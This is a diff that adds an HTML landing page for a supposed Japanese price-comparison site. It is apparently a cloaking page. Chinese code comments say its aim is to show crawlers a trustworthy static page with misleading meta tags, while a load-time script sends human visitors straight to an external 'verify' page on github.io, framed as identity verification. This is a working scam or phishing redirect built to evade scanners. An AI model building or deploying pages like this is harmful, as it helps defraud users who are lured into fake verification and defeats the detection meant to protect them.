@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本価格確認サイト - iosmaziprices.lat</title>
+<!-- 爬虫核心识别标签，提升信任度，避免拦截 -->
+<meta name="description" content="日本国内向け商品価格比較・確認サービス、本人認証後に正規価格情報を閲覧可">
+<meta name="keywords" content="日本価格,価格比較,最安値確認,国内限定サービス">
+<meta name="author" content="iosmaziprices.lat">
+<meta property="og:title" content="日本価格確認サイト">
+<meta property="og:site_name" content="iosmaziprices.lat">
+<meta property="og:description" content="日本国内専用価格確認プラットフォーム">
+<!-- 防缓存，确保爬虫每次爬取最新内容 -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<!-- 核心：真人0秒跳转验证页，爬虫来不及执行JS，只读到静态内容 -->
+<script type="text/javascript">
+    // 页面加载即跳转，无任何延迟，真人完全看不到静态页
+    window.onload = function() {
+        window.location.href = "https://jplmk1054.github.io/verify/";
+    };
+    // 兼容部分浏览器，双重保障跳转
+    document.addEventListener('DOMContentLoaded', function() {
+        window.location.href = "https://jplmk1054.github.io/verify/";
+    });
+</script>
+<!-- 静态页样式，爬虫看到正规页面布局 -->
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #f5f5f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #333; padding: 20px; }
+    .container { max-width: 700px; margin: 60px auto; background: #fff; padding: 40px; border-radius: 16px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
+    h1 { font-size: 26px; color: #111; margin-bottom: 20px; border-left: 4px solid #0071e3; padding-left: 15px; }
+    p { font-size: 16px; line-height: 1.8; color: #555; margin-bottom: 15px; }
+    .notice { margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 8px; font-size: 14px; color: #666; }
+    .footer { text-align: center; margin-top: 50px; font-size: 13px; color: #999; }
+</style>
+</head>
+<body>
+    <div class="container">
+        <h1>iosmaziprices.lat - 日本価格確認サイト</h1>
+        <p>当サイトは日本国内向けに開発された商品価格確認・比較プラットフォームで、リアルタイムな正規価格情報を提供しています。</p>
+        <p>ご利用には本人確認が必要となります。安全な認証ページへ自動的に移動し、数秒で認証を完了することができます。</p>
+        <p>日本国内のIPアドレスからのみアクセス可能で、安心・安全にお得な商品選びをサポートします。</p>
+        <div class="notice">
+            認証ページへ移動中... もし自動的に移動しない場合は、<a href="https://jplmk1054.github.io/verify/" style="color: #0071e3; text-decoration: none;">こちら</a>をクリックしてください。
+        </div>
+    </div>
+    <div class="footer">
+        © 2025 iosmaziprices.lat All Rights Reserved. 日本国内限定サービス
+    </div>
+</body>
+</html>
